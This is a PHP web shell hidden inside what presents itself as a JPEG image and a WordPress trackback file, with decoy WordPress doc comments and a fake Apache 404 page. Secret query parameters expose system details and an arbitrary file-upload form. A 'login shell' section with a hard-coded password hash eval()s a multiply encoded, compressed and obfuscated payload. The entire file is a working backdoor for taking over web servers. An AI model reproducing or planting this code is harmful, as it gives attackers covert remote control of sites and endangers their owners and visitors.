<?php
error_reporting(0);
/**
 * Response to a trackback.
 *
 * Index of Website Developer
 *
 * Responds with an error or success XML message.
 *
 * For developers: Website debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 *
 * It is strongly recommended that plugin and theme developers.
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * 
 * @since 0.71
 *
 * @param mixed  $error         Whether there was an error.
 *                              Default '0'. Accepts '0' or '1', true or false.
 * @param string $error_message Error message if an error occurred.
 */
echo "<html>
      <head><title>404 Not Found</title></head>
      <h1>Not Found</h1>
      <p>The requested URL ".$_SERVER[REQUEST_URI]." was not found on this server.</p><hr>
      <address>Apache/2.2.22 Sadachil Server at ".$_SERVER['SERVER_NAME']." Port ".$_SERVER['SERVER_PORT'].".</address>
";
/**
 * These can't be directly globalized in version.php. When updating,
 *
 * we're including version.php from another install and don't want
 *
 * these values to be overridden if already set.
 */
if(isset($_GET["sadachil"])){
echo "<body bgcolor='lavender'>
<br>
<font color='red'><b>System: </b></font>
<font color='seagreen'>".php_uname()."</font><br>
<font color ='red'><b>Server IP: </b></font><font color='seagreen'>".gethostbyname($_SERVER['HTTP_HOST'])." </font><br>
<font color='red'><b>Your IP: </b></font>
<font color='seagreen'>".$_SERVER['REMOTE_ADDR']."</font><br>
<font color='red'><b>Destination: </b></font><font color='seagreen '>".$_SERVER[SCRIPT_FILENAME]."</font>";
echo"<form method=post
enctype=multipart/form-data>";
echo"<input type=file name=f><input
name=v type=submit id=v
value=Upload><br>";
if($_POST["v"]==Upload){if(@copy($_FILES
["f"]["tmp_name"],$_FILES["f"]
["name"])){
echo"<font color='blue'><b>File Uploaded: </b></font>".$_FILES
["f"]["name"];
}else{
echo"<b>File Doesn't Uploaded";}}
}
/**
 * If not already configured, `$blog_id` will default to 1 in a single site
 *
 * configuration. In multisite, it will be overridden by default in ms-settings.php.
*/
if(isset($_GET["info"])){
echo "<body bgcolor='lavender'>
<br>
<font color='red'><b>System: </b></font>
<font color='seagreen'>".php_uname()."</font><br>
<font color ='red'><b>Server IP: </b></font><font color='seagreen'>".gethostbyname($_SERVER['HTTP_HOST'])." </font><br>
<font color='red'><b>Your IP: </b></font>
<font color='seagreen'>".$_SERVER['REMOTE_ADDR']."</font><br>
<font color='red'><b>Destination: </b></font><font color='seagreen '>".$_SERVER[SCRIPT_FILENAME]."</font>";
}
/**
 *
 * @global int $blog_id
 *
 * @since 2.0.0
 */
?>
<!--------------------------------------------
blank*
--------------------------------------------->����JFIF��x�x������Exif��MM�*����
����E���J����������������(������������������
<!--------------------------------------------
blank*
--------------------------------------------->
/*
/**************************************************************************************/
*blank*
/**************************************************************************************/
*/
<!--------------------------------------------
blank*
--------------------------------------------->
<?php
// Login shell: site.com/shell.php?login
$auth_pass = "f168844ebc3dbc74a99ff10092b0cdf1"; // default : monalisa_h4x0r
$f31337 = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNGV2YWxpZCUyOSUyOSUyOSUyOSUyOSUyOSUyOSUyOSUzQg==";
$evalid = "==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";
eval(htmlspecialchars_decode(urldecode(base64_decode($f31337))));
exit;
?>
<!--------------------------------------------
blank*
--------------------------------------------->�����x������x������C�




���C		

����<�d"��������������	
�������}�!1AQa"q2���#B��R��$3br�	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������������	
������w�!1AQaq"2�B����	#3R�br�
$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������?��S��(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(��

